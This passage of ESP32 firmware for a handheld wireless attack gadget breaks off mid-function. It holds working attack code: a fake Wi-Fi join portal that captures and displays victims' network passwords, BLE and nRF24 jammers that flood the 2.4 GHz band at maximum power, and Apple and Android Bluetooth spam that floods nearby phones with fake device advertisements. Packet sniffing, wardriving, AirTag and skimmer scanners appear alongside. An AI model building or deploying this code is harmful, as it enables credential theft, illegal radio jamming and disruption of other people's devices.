  html += "button{width:100%;padding:14px;background:#007AFF;color:white;border:none;border-radius:8px;";
  html += "font-size:16px;font-weight:500;cursor:pointer;margin-top:10px;}";
  html += "button:active{background:#0051D5;}";
  html += ".info{text-align:center;color:#86868b;font-size:12px;margin-top:20px;line-height:1.4;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='wifi-symbol'><div class='wifi-icon'></div></div>";
  html += "<h2>" + selectedSSID + "</h2>";
  html += "<div class='subtitle'>Enter password to connect</div>";
  html += "<form action='/post' method='post'>";
  html += "<div class='form-group'>";
  html += "<label>Password</label>";
  html += "<input type='password' name='password' placeholder='Password' required autofocus>";
  html += "</div>";
  html += "<button type='submit'>Join</button>";
  html += "</form>";
  html += "<div class='info'>Your device will automatically connect to this network in the future.</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handlePortalPost() {
  if (webServer.hasArg("password")) {
    capturedPassword = webServer.arg("password");
    addToConsole("PWD: " + capturedPassword);
    Serial.println("PASSWORD CAPTURED: " + capturedPassword);
    
    tft.fillScreen(COLOR_BG);
    drawHeader("PASSWORD CAPTURED");
    tft.setTextSize(2);
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(20, 80);
    tft.println("SSID:");
    tft.setCursor(20, 100);
    tft.setTextColor(COLOR_TEXT);
    tft.println(selectedSSID.substring(0, 25));
    
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(20, 130);
    tft.println("PASSWORD:");
    tft.setCursor(20, 150);
    tft.setTextColor(COLOR_WARNING);
    tft.println(capturedPassword.substring(0, 25));
    
    delay(5000);
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta http-equiv='refresh' content='3;url=/'>";
  html += "<style>body{font-family:Arial;text-align:center;margin-top:50px;}";
  html += ".spinner{border:4px solid #f3f3f3;border-top:4px solid #007AFF;";
  html += "border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}";
  html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head>";
  html += "<body><h2>Verifying Password...</h2>";
  html += "<div class='spinner'></div>";
  html += "<p>Please wait while we connect you to the network.</p></body></html>";
  
  webServer.send(200, "text/html", html);
}

// ==================== Sniffer Functions ====================

void startSniffer() {
  snifferActive = true;
  packetCount = 0;
  beaconCount = 0;
  dataCount = 0;
  deauthCount = 0;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  currentState = SNIFFER_ACTIVE;
  addToConsole("Sniffer started on Ch" + String(snifferChannel));
  
  displaySnifferActive();
}

void stopSniffer() {
  snifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Sniffer stopped");
}

void displaySnifferActive() {
  tft.fillScreen(COLOR_BG);
  drawHeader("SNIFFING");
  
  // Stats bar at top
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch:%d Total:%d", snifferChannel, packetCount);
  
  tft.setCursor(SIDE_MARGIN, statsY + 12);
  tft.setTextColor(COLOR_SUCCESS);
  tft.printf("Beacon:%d ", beaconCount);
  tft.setTextColor(COLOR_ACCENT);
  tft.printf("Data:%d ", dataCount);
  tft.setTextColor(COLOR_WARNING);
  tft.printf("Deauth:%d", deauthCount);
  
  // Scrollable packet list
  int listY = HEADER_HEIGHT + 35;
  tft.drawLine(0, listY - 2, SCREEN_WIDTH, listY - 2, COLOR_BORDER);
  
  int visiblePackets = 8;
  int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
  
  for (int i = 0; i < visiblePackets && (snifferScrollOffset + i) < totalPackets; i++) {
    int idx = (packetHistoryIndex - 1 - snifferScrollOffset - i + MAX_SNIFFER_PACKETS) % MAX_SNIFFER_PACKETS;
    
    if (packetHistory[idx].timestamp == 0) continue;
    
    int y = listY + (i * 26);
    
    // Packet type indicator
    uint16_t typeColor = COLOR_TEXT;
    const char* typeName = "UNK";
    
    if (packetHistory[idx].type == 0x80) {
      typeColor = COLOR_SUCCESS;
      typeName = "BCN";
    } else if ((packetHistory[idx].type & 0x0C) == 0x08) {
      typeColor = COLOR_ACCENT;
      typeName = "DAT";
    } else if (packetHistory[idx].type == 0xC0 || packetHistory[idx].type == 0xA0) {
      typeColor = COLOR_WARNING;
      typeName = "DEA";
    } else if (packetHistory[idx].type == 0x40) {
      typeColor = COLOR_PURPLE;
      typeName = "PRB";
    }
    
    // Draw packet entry
    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 24, COLOR_ITEM_BG);
    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 24, COLOR_BORDER);
    
    // Type
    tft.setTextColor(typeColor);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN + 5, y + 5);
    tft.print(typeName);
    
    // RSSI bar
    int rssi = packetHistory[idx].rssi;
    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 40);
    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
    tft.fillRect(SIDE_MARGIN + 5, y + 16, barWidth, 3, barColor);
    
    // RSSI value
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 50, y + 13);
    tft.printf("%ddBm", rssi);
    
    // Channel
    tft.setTextColor(COLOR_ACCENT);
    tft.setCursor(SIDE_MARGIN + 100, y + 13);
    tft.printf("Ch%d", packetHistory[idx].channel);
    
    // Time ago
    unsigned long ago = (millis() - packetHistory[idx].timestamp) / 1000;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 140, y + 13);
    if (ago < 60) {
      tft.printf("%ds", ago);
    } else {
      tft.printf("%dm", ago / 60);
    }
  }
  
  // Scroll indicator
  if (totalPackets > visiblePackets) {
    tft.setTextColor(COLOR_PURPLE);
    tft.setTextSize(1);
    tft.setCursor(SCREEN_WIDTH / 2 - 40, listY + (visiblePackets * 26) + 5);
    tft.printf("Scroll %d/%d", (snifferScrollOffset / visiblePackets) + 1, 
               (totalPackets + visiblePackets - 1) / visiblePackets);
  }
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(70, SCREEN_HEIGHT - 80);
  tft.println("Tap to stop");
}

void updateSnifferDisplay() {
  // Just refresh the stats, not the whole list
  int statsY = HEADER_HEIGHT + 5;
  tft.fillRect(SIDE_MARGIN, statsY, BUTTON_WIDTH, 24, COLOR_BG);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch:%d Total:%d", snifferChannel, packetCount);
  
  tft.setCursor(SIDE_MARGIN, statsY + 12);
  tft.setTextColor(COLOR_SUCCESS);
  tft.printf("Beacon:%d ", beaconCount);
  tft.setTextColor(COLOR_ACCENT);
  tft.printf("Data:%d ", dataCount);
  tft.setTextColor(COLOR_WARNING);
  tft.printf("Deauth:%d", deauthCount);
  
  // Refresh the packet list (non-blocking)
  displaySnifferActive();
}

// ==================== BLE Functions ====================

void scanBLEDevices() {
  if (bleJammerActive || appleSpamActive || androidSpamActive) {
    BLEDevice::deinit(false);
    delay(100);
  }
  
  tft.fillScreen(COLOR_BG);
  
  // Header with live indicator
  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 10);
  tft.print("BLE SCAN");
  
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(60, 120);
  tft.println("Scanning");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(80, 145);
  tft.println("Please wait...");
  
  addToConsole("BLE continuous scan started");
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  // Start continuous scan
  continuousBLEScan = true;
  pBLEScan->start(0, nullptr, false);  // 0 = infinite scan
  
  delay(3000);  // Initial scan period
  
  displayBLEScanResults();
}

void displayBLEScanResults() {
  currentState = BLE_SCAN_RESULTS;
  tft.fillScreen(COLOR_BG);
  
  // Header with live indicator
  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 10);
  tft.print("BLE LIVE");
  
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
  
  // Status
  int statusY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(SIDE_MARGIN, statusY);
  tft.printf("Devices: %d", bleDeviceCount);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SCREEN_WIDTH - 60, statusY);
  tft.print("LIVE");
  
  int y = HEADER_HEIGHT + 25;
  int displayCount = (bleDeviceCount > 6) ? 6 : bleDeviceCount;
  
  for (int i = 0; i < displayCount; i++) {
    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_BORDER);
    
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y + 5);
    
    String displayName = bleDevices[i].name;
    if (displayName.length() > 24) {
      displayName = displayName.substring(0, 24);
    }
    tft.println(displayName);
    
    // Signal bar
    int rssi = bleDevices[i].rssi;
    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 60);
    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
    
    tft.fillRect(SIDE_MARGIN + 5, y + 20, barWidth, 4, barColor);
    
    tft.setTextColor(COLOR_ACCENT);
    tft.setCursor(SIDE_MARGIN + 70, y + 18);
    tft.printf("%d dBm", rssi);
    
    y += 34;
  }
  
  if (bleDeviceCount > 6) {
    tft.setTextColor(COLOR_ACCENT);
    tft.setTextSize(1);
    tft.setCursor(90, y + 5);
    tft.printf("+ %d more...", bleDeviceCount - 6);
  }
  
  drawBackButton();
}

// ==================== BLE JAMMER Functions ====================

void startBLEJammer() {
  if (bleJammerActive) return;
  
  bleJammerActive = true;
  bleJamPackets = 0;
  lastBLEJamTime = millis();
  
  BLEDevice::init("P4WNC4K3");
  pAdvertising = BLEDevice::getAdvertising();
  
  currentState = BLE_JAM_ACTIVE;
  addToConsole("BLE jammer started");
  
  displayBLEJammerActive();
}

void stopBLEJammer() {
  if (!bleJammerActive) return;
  
  bleJammerActive = false;
  BLEDevice::deinit(false);
  
  addToConsole("BLE jammer stopped");
  showMessage("BLE Jammer Stopped", COLOR_SUCCESS);
  delay(1000);
}

void performBLEJam() {
  // BURST MODE: Send multiple packets per cycle
  for (int burst = 0; burst < 3; burst++) {
    char randomName[20];
    sprintf(randomName, "JAM_%02X%02X%02X", 
            random(0, 256), random(0, 256), random(0, 256));
    
    uint8_t randomMAC[6];
    for (int i = 0; i < 6; i++) {
      randomMAC[i] = random(0, 256);
    }
    
    BLEAdvertisementData advertisementData;
    advertisementData.setName(randomName);
    advertisementData.setManufacturerData(std::string((char*)randomMAC, 6));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delayMicroseconds(100);  // Very short delay
    pAdvertising->stop();
    
    bleJamPackets++;
  }
  
  // Add fake Apple/Android devices to pollute scan results
  static uint8_t fakeCounter = 0;
  if (fakeCounter % 5 == 0) {
    BLEAdvertisementData fakeApple;
    fakeApple.setName("AirPods Pro");
    uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x02, random(0, 256), random(0, 256)};
    fakeApple.setManufacturerData(std::string((char*)appleData, 6));
    pAdvertising->setAdvertisementData(fakeApple);
    pAdvertising->start();
    delayMicroseconds(100);
    pAdvertising->stop();
  }
  fakeCounter++;
}

void displayBLEJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLE JAMMING");
  
  updateBLEJammerDisplay();
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_WARNING);
  tft.setCursor(60, SCREEN_HEIGHT - 80);
  tft.println("Tap to stop");
}

void updateBLEJammerDisplay() {
  int startY = HEADER_HEIGHT + 20;
  tft.fillRect(SIDE_MARGIN, startY, BUTTON_WIDTH, 120, COLOR_BG);
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_WARNING);
  tft.setCursor(65, startY + 10);
  tft.println("JAMMING");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  
  int y = startY + 45;
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Mode: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.println(jammerModeText);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Packets: ");
  tft.setTextColor(COLOR_WARNING);
  tft.println(bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Duration: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
}

// ==================== nRF24 Jammer Functions ====================

void startNRFJammer() {
  if (nrfJammerActive) return;
  
  if (!nrf1Available && !nrf2Available) {
    showMessage("No nRF24 modules!", COLOR_WARNING);
    delay(1500);
    return;
  }
  
  nrfJammerActive = true;
  nrfJamPackets = 0;
  nrf1Packets = 0;
  nrf2Packets = 0;
  lastNRFJamTime = millis();
  
  if (nrf1Available) {
    radio1.setChannel(nrfChannel);
    radio1.setPALevel(RF24_PA_MAX);
    radio1.setDataRate(RF24_2MBPS);
    radio1.stopListening();
    radio1.openWritingPipe(0xF0F0F0F0E1LL);
  }
  
  if (nrf2Available && dualNRFMode) {
    radio2.setChannel(nrfChannel + 25);
    radio2.setPALevel(RF24_PA_MAX);
    radio2.setDataRate(RF24_2MBPS);
    radio2.stopListening();
    radio2.openWritingPipe(0xF0F0F0F0E2LL);
  }
  
  currentState = NRF_JAM_ACTIVE;
  
  String modeMsg = "nRF24 jammer started";
  if (dualNRFMode && nrf1Available && nrf2Available) {
    modeMsg += " (DUAL MODE)";
  }
  addToConsole(modeMsg);
  
  displayNRFJammerActive();
}

void stopNRFJammer() {
  if (!nrfJammerActive) return;
  
  nrfJammerActive = false;
  
  if (nrf1Available) radio1.powerDown();
  if (nrf2Available) radio2.powerDown();
  
  addToConsole("nRF24 jammer stopped");
  showMessage("nRF24 Jammer Stopped", COLOR_SUCCESS);
  delay(1000);
}
// CONTINUATION - Add this to the end of your existing code
// This completes the performNRFJam() and adds missing functions

void performNRFJam() {
  // BURST MODE: Send multiple jam packets rapidly
  uint8_t jamData1[32];
  uint8_t jamData2[32];
  
  // Send 5 bursts per cycle for maximum jamming
  for (int burst = 0; burst < 5; burst++) {
    // Randomize pattern each burst
    for (int i = 0; i < 32; i++) {
      jamData1[i] = random(0, 256);
      jamData2[i] = random(0, 256);
    }
    
    // Transmit on Radio 1
    if (nrf1Available) {
      radio1.write(jamData1, 32);
      nrf1Packets++;
      nrfJamPackets++;
    }
    
    // Transmit on Radio 2 (dual mode)
    if (nrf2Available && dualNRFMode) {
      radio2.write(jamData2, 32);
      nrf2Packets++;
      nrfJamPackets++;
    }
  }
  
  // RAPID channel hopping for full spectrum jamming
  static uint8_t hopCounter = 0;
  hopCounter++;
  
  if (hopCounter % 20 == 0) {  // Hop every 20 cycles
    nrfChannel = (nrfChannel + 1) % 126;  // Full 2.4GHz spectrum
    
    if (nrf1Available) {
      radio1.setChannel(nrfChannel);
    }
    if (nrf2Available && dualNRFMode) {
      // Offset channel for wider coverage
      radio2.setChannel((nrfChannel + 50) % 126);
    }
  }
}

void displayNRFJammerActive() {
  tft.fillScreen(COLOR_BG);
  
  if (dualNRFMode && nrf1Available && nrf2Available) {
    drawHeader("DUAL nRF24");
  } else {
    drawHeader("nRF24 JAM");
  }
  
  updateNRFJammerDisplay();
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_WARNING);
  tft.setCursor(60, SCREEN_HEIGHT - 80);
  tft.println("Tap to stop");
}

void updateNRFJammerDisplay() {
  int startY = HEADER_HEIGHT + 20;
  tft.fillRect(SIDE_MARGIN, startY, BUTTON_WIDTH, 140, COLOR_BG);
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_WARNING);
  int headerY = startY + 10;
  
  if (dualNRFMode && nrf1Available && nrf2Available) {
    tft.setCursor(45, headerY);
    tft.println("DUAL MODE");
    headerY += 25;
    tft.setTextSize(1);
    tft.setTextColor(COLOR_ACCENT);
    tft.setCursor(75, headerY);
    tft.println("2x POWER");
  } else {
    tft.setCursor(65, headerY);
    tft.println("JAMMING");
  }
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  
  int y = headerY + 25;
  
  // Radio 1 status
  if (nrf1Available) {
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.print("Radio 1 Ch: ");
    tft.setTextColor(COLOR_ACCENT);
    tft.print(nrfChannel);
    tft.setTextColor(COLOR_TEXT);
    tft.print(" (");
    tft.print(2400 + nrfChannel);
    tft.println(" MHz)");
    
    y += 15;
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.setTextColor(COLOR_PURPLE);
    tft.printf("  Packets: %d", nrf1Packets);
  }
  
  // Radio 2 status
  if (nrf2Available && dualNRFMode) {
    y += 20;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.print("Radio 2 Ch: ");
    tft.setTextColor(COLOR_ACCENT);
    tft.print(nrfChannel + 25);
    tft.setTextColor(COLOR_TEXT);
    tft.print(" (");
    tft.print(2425 + nrfChannel);
    tft.println(" MHz)");
    
    y += 15;
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.setTextColor(COLOR_PURPLE);
    tft.printf("  Packets: %d", nrf2Packets);
  }
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Total: ");
  tft.setTextColor(COLOR_WARNING);
  tft.println(nrfJamPackets);
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Duration: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.printf("%d sec", (millis() - lastNRFJamTime) / 1000);
}

// ==================== Combined Jammer ====================

void startCombinedJammer() {
  currentState = WIFI_BLE_NRF_JAM;
  startBLEJammer();
  startNRFJammer();
  addToConsole("Combined jammer active");
  displayCombinedJammer();
}

void stopCombinedJammer() {
  stopBLEJammer();
  stopNRFJammer();
  currentState = BLE_MENU;
  drawBLEMenu();
}

void displayCombinedJammer() {
  tft.fillScreen(COLOR_BG);
  drawHeader("COMBINED JAM");
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_WARNING);
  tft.setCursor(30, HEADER_HEIGHT + 30);
  tft.println("FULL SPECTRUM");
  
  int y = HEADER_HEIGHT + 70;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("BLE Packets: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.println(bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("nRF Packets: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.println(nrfJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Total: ");
  tft.setTextColor(COLOR_WARNING);
  tft.println(bleJamPackets + nrfJamPackets);
  
  y += 25;
  tft.setTextColor(COLOR_SUCCESS);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.println("Jamming BLE + 2.4GHz RF");
  
  drawBackButton();
}

// ==================== BLE Spam Functions ====================

void performAppleSpam() {
  // BURST MODE: Multiple spam packets
  for (int burst = 0; burst < 3; burst++) {
    static uint8_t appleCounter = 0;
    
    BLEAdvertisementData advertisementData;
    
    // Rotate through different Apple devices rapidly
    switch (appleCounter % 10) {
      case 0:
        advertisementData.setName("AirPods Pro");
        break;
      case 1:
        advertisementData.setName("AirPods Max");
        break;
      case 2:
        advertisementData.setName("AirPods Gen 3");
        break;
      case 3:
        advertisementData.setName("iPhone 15 Pro");
        break;
      case 4:
        advertisementData.setName("Apple Watch Ultra");
        break;
      case 5:
        advertisementData.setName("AirTag");
        break;
      case 6:
        advertisementData.setName("MacBook Pro");
        break;
      case 7:
        advertisementData.setName("iPad Pro");
        break;
      case 8:
        advertisementData.setName("Beats Studio");
        break;
      case 9:
        advertisementData.setName("HomePod");
        break;
    }
    
    // Random manufacturer data for more chaos
    uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x02, random(0, 256), random(0, 256)};
    advertisementData.setManufacturerData(std::string((char*)appleData, 6));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delayMicroseconds(100);
    pAdvertising->stop();
    
    appleCounter++;
  }
}

void performAndroidSpam() {
  // BURST MODE: Multiple spam packets
  for (int burst = 0; burst < 3; burst++) {
    static uint8_t androidCounter = 0;
    
    BLEAdvertisementData advertisementData;
    
    // Rotate through Android devices rapidly
    switch (androidCounter % 10) {
      case 0:
        advertisementData.setName("Galaxy Buds Pro");
        break;
      case 1:
        advertisementData.setName("Pixel Buds Pro");
        break;
      case 2:
        advertisementData.setName("Galaxy Watch 6");
        break;
      case 3:
        advertisementData.setName("OnePlus Buds Pro");
        break;
      case 4:
        advertisementData.setName("Xiaomi Buds 4");
        break;
      case 5:
        advertisementData.setName("Nothing Ear");
        break;
      case 6:
        advertisementData.setName("Sony WF-1000XM5");
        break;
      case 7:
        advertisementData.setName("Pixel 8 Pro");
        break;
      case 8:
        advertisementData.setName("Galaxy S24");
        break;
      case 9:
        advertisementData.setName("Redmi Buds");
        break;
    }
    
    // Fast Play manufacturer data
    uint8_t androidData[] = {0xE0, 0x00, random(0, 256), random(0, 256)};
    advertisementData.setManufacturerData(std::string((char*)androidData, 4));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delayMicroseconds(100);
    pAdvertising->stop();
    
    androidCounter++;
  }
}

// ==================== AirTag Scanner ====================

void startAirTagScanner() {
  currentState = AIRTAG_SCANNER;
  airTagCount = 0;
  
  tft.fillScreen(COLOR_BG);
  drawHeader("AIRTAG SCAN");
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(60, 120);
  tft.println("Scanning");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(60, 145);
  tft.println("Looking for AirTags");
  
  addToConsole("AirTag scan started");
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(10, false);
  
  displayAirTagResults();
}

void displayAirTagResults() {
  currentState = AIRTAG_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawHeader("AIRTAGS");
  
  if (airTagCount == 0) {
    tft.setTextSize(2);
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(60, 100);
    tft.println("No AirTags");
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(75, 130);
    tft.println("You're clear!");
  } else {
    int y = HEADER_HEIGHT + 10;
    for (int i = 0; i < airTagCount && i < 5; i++) {
      tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
      tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_WARNING);
      
      tft.setTextSize(1);
      tft.setTextColor(COLOR_WARNING);
      tft.setCursor(SIDE_MARGIN + 5, y + 5);
      tft.print("! ");
      String addr = airTags[i].address;
      if (addr.length() > 24) addr = addr.substring(0, 24);
      tft.println(addr);
      
      tft.setCursor(SIDE_MARGIN + 5, y + 19);
      tft.setTextColor(COLOR_TEXT);
      tft.printf("RSSI:%d Cnt:%d", airTags[i].rssi, airTags[i].detectionCount);
      
      y += 34;
    }
  }
  
  drawBackButton();
}

// ==================== Skimmer Detector ====================

void startSkimmerDetector() {
  currentState = SKIMMER_DETECTOR;
  skimmerCount = 0;
  
  tft.fillScreen(COLOR_BG);
  drawHeader("SKIMMER SCAN");
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(60, 120);
  tft.println("Scanning");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(50, 145);
  tft.println("Looking for skimmers");
  
  addToConsole("Skimmer scan started");
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(8, false);
  
  displaySkimmerResults();
}

void displaySkimmerResults() {
  currentState = SKIMMER_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawHeader("SKIMMERS");
  
  if (skimmerCount == 0) {
    tft.setTextSize(2);
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(60, 100);
    tft.println("All Clear");
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(60, 130);
    tft.println("No skimmers found");
  } else {
    int y = HEADER_HEIGHT + 10;
    for (int i = 0; i < skimmerCount && i < 5; i++) {
      tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
      tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_CRITICAL);
      
      tft.setTextSize(1);
      tft.setTextColor(COLOR_CRITICAL);
      tft.setCursor(SIDE_MARGIN + 5, y + 5);
      tft.print("! ");
      String name = skimmers[i].name;
      if (name.length() > 20) name = name.substring(0, 20);
      tft.println(name);
      
      tft.setCursor(SIDE_MARGIN + 5, y + 19);
      tft.setTextColor(COLOR_WARNING);
      tft.printf("RSSI: %d dBm (CLOSE!)", skimmers[i].rssi);
      
      y += 34;
    }
  }
  
  drawBackButton();
}

// ==================== Wardriving ====================

void startWardriving() {
  currentState = WARDRIVING_MODE;
  
  tft.fillScreen(COLOR_BG);
  drawHeader("WARDRIVING");
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(60, 120);
  tft.println("Scanning");
  
  addToConsole("Wardriving started");
  
  wardrivingStats.totalAPs = 0;
  wardrivingStats.openAPs = 0;
  wardrivingStats.securedAPs = 0;
  wardrivingStats.strongestSSID = "";
  wardrivingStats.strongestRSSI = -100;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks();
  wardrivingStats.totalAPs = n;
  
  for (int i = 0; i < n; i++) {
    if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
      wardrivingStats.openAPs++;
    } else {
      wardrivingStats.securedAPs++;
    }
    
    int rssi = WiFi.RSSI(i);
    if (rssi > wardrivingStats.strongestRSSI) {
      wardrivingStats.strongestRSSI = rssi;
      wardrivingStats.strongestSSID = WiFi.SSID(i);
    }
  }
  
  displayWardrivingResults();
}

void displayWardrivingResults() {
  tft.fillScreen(COLOR_BG);
  drawHeader("WARDRIVE");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  
  int y = HEADER_HEIGHT + 20;
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Total APs: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.println(wardrivingStats.totalAPs);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Open Networks: ");
  tft.setTextColor(COLOR_SUCCESS);
  tft.println(wardrivingStats.openAPs);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Secured: ");
  tft.setTextColor(COLOR_WARNING);
  tft.println(wardrivingStats.securedAPs);
  
  y += 25;
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.println("Strongest Signal:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  String truncSSID = wardrivingStats.strongestSSID;
  if (truncSSID.length() > 28) {
    truncSSID = truncSSID.substring(0, 28);
  }
  tft.println(truncSSID);
  
  y += 15;
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.printf("RSSI: %d dBm", wardrivingStats.strongestRSSI);
  
  y += 25;
  tft.setTextColor(COLOR_TEXT);
